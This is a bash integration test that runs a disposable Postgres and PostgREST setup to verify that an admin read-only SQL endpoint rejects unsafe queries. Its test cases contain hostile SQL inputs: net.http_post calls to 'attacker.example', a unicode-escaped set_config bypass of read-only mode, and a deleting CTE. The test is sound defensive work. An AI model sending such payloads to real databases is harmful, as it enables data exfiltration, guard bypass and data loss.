#!/usr/bin/env bash
# Disposable PostgREST integration test for the audit SQL RPC.
# Throwaway Postgres cluster + synthetic fixture + REAL repo migrations, then a
# real PostgREST server; calls /rpc/admin_run_readonly_sql over HTTP with
# locally signed synthetic JWTs. Never touches the live project.
set -euo pipefail
if [ "$(id -u)" = 0 ]; then exec su nobody -s /bin/bash -c "PG=${PG:-} PGRST=${PGRST:-} bash $(readlink -f "$0")"; fi
PG=${PG:-$(nix build nixpkgs#postgresql_16 --no-link --print-out-paths | grep -v -- -man | head -1)}
PGRST=${PGRST:-$(nix build nixpkgs#postgrest --no-link --print-out-paths | head -1)}
export PATH="$PG/bin:$PGRST/bin:$PATH"
D=$(mktemp -d /tmp/pgrst.XXXX)
cleanup() { [ -n "${RPID:-}" ] && kill "$RPID" 2>/dev/null || true; pg_ctl -D "$D/data" stop -m immediate >/dev/null 2>&1 || true; rm -rf "$D"; }
trap cleanup EXIT
LC_ALL=C LANG=C initdb --no-locale -E UTF8 -D "$D/data" -U harness -A trust >/dev/null
pg_ctl -D "$D/data" -o "-k $D -p 55440 -c listen_addresses=''" -l "$D/log" start >/dev/null
P="psql -h $D -p 55440 -U harness -d postgres -v ON_ERROR_STOP=1 -q"
HERE=$(cd "$(dirname "$0")" && pwd); ROOT="$HERE/../.."
$P -f "$HERE/fixture.sql" >/dev/null
for m in "$ROOT"/drizzle/migrations/000[0-6]_*.sql; do sed '/--> statement-breakpoint/d' "$m" | $P >/dev/null; done
$P <<'SQL'
CREATE ROLE authenticator LOGIN NOINHERIT;
GRANT anon, authenticated TO authenticator;
-- Same per-role limits as the live project.
ALTER ROLE authenticated SET statement_timeout = '8s';
ALTER ROLE anon SET statement_timeout = '3s';
INSERT INTO rota_assignments (staff_id, session_date) VALUES ('00000000-0000-0000-0000-000000000051', '2026-10-01');
SQL

SECRET="harness-only-jwt-secret-0123456789abcdef"
jwt() { node -e '
const c=require("crypto");const b=(o)=>Buffer.from(JSON.stringify(o)).toString("base64url");
const h=b({alg:"HS256",typ:"JWT"}),p=b({sub:process.argv[1],role:"authenticated",exp:Math.floor(Date.now()/1000)+600});
process.stdout.write(h+"."+p+"."+c.createHmac("sha256",process.argv[2]).update(h+"."+p).digest("base64url"));' "$1" "$SECRET"; }
A=$(jwt 00000000-0000-0000-0000-00000000000a); S=$(jwt 00000000-0000-0000-0000-000000000051)

PGRST_DB_URI="postgres://authenticator@/postgres?host=$D&port=55440" PGRST_DB_SCHEMAS=public PGRST_DB_ANON_ROLE=anon \
PGRST_JWT_SECRET="$SECRET" PGRST_SERVER_PORT=55441 PGRST_SERVER_HOST=127.0.0.1 PGRST_LOG_LEVEL=crit postgrest >"$D/pgrst.log" 2>&1 &
RPID=$!
for _ in $(seq 1 100); do [ "$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:55441/)" = 200 ] && break; sleep 0.2; done  # wait for schema cache (root 200), not just a listening socket

PASS=0; FAILS=0
check() { # name method token query expect_status_prefix [body_regex]
  local enc; enc=$(node -e 'process.stdout.write(encodeURIComponent(process.argv[1]))' "$4")
  local auth=(); [ -n "$3" ] && auth=(-H "Authorization: Bearer $3")
  local out code
  if [ "$2" = GET ]; then
    out=$(curl -s -w '\n%{http_code}' "${auth[@]}" "http://127.0.0.1:55441/rpc/admin_run_readonly_sql?p_query=$enc")
  else
    out=$(curl -s -w '\n%{http_code}' "${auth[@]}" -H 'Content-Type: application/json' -X POST \
      -d "$(node -e 'process.stdout.write(JSON.stringify({p_query:process.argv[1]}))' "$4")" http://127.0.0.1:55441/rpc/admin_run_readonly_sql)
  fi
  code=$(echo "$out" | tail -1); local body; body=$(echo "$out" | sed '$d')
  if [[ "$code" == $5* ]] && { [ -z "${6:-}" ] || echo "$body" | grep -Eq "$6"; }; then
    PASS=$((PASS+1)); printf 'PASS  %-62s %s\n' "$1" "$code"
  else
    FAILS=$((FAILS+1)); printf 'FAIL  %-62s %s %s\n' "$1" "$code" "$(echo "$body" | head -c 200)"
  fi
}
check "GET admin safe report returns rows"             GET  "$A" "select count(*)::int as n from rota_assignments" 200 '"n": ?1'
check "POST admin safe report (forced read-only) works" POST "$A" "select count(*)::int as n from rota_assignments" 200 '"n": ?1'
check "GET admin describe_schema-style query"          GET  "$A" "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' ORDER BY table_name" 200 'rota_assignments'
check "GET non-admin denied"                           GET  "$S" "select 1" 4 'Admin role required'
check "GET anonymous denied"                           GET  ""   "select 1" 4
check "GET admin raw payload column denied"            GET  "$A" "select source_row from icu_detection_matches" 4 'permission denied'
check "GET admin secret URL column denied"             GET  "$A" "select rota_report_url from clwrota_sync_state" 4 'permission denied'
check "GET admin net.http_post denied"                 GET  "$A" "select net.http_post('https://attacker.example')" 4
check "POST admin net.http_post denied"                POST "$A" "select net.http_post('https://attacker.example')" 4
check "GET admin unicode-escaped set_config denied"    GET  "$A" "select U&\"set\\005fconfig\"('transaction_read_only','off',true)" 4
check "POST admin data-modifying CTE denied"           POST "$A" "with d as (delete from rota_assignments returning id) select * from d" 4
QUEUE=$($P -At -c "select count(*) from net.http_request_queue"); ROWS=$($P -At -c "select count(*) from rota_assignments")
if [ "$QUEUE" = 0 ] && [ "$ROWS" = 1 ]; then PASS=$((PASS+1)); echo "PASS  no side effects reached the database (queue=0, rows intact)"; else FAILS=$((FAILS+1)); echo "FAIL  side effects: queue=$QUEUE rows=$ROWS"; fi
echo "postgrest harness ($(postgrest --version 2>/dev/null | head -1)): $((PASS+FAILS)) cases, $FAILS failures"
[ "$FAILS" = 0 ]
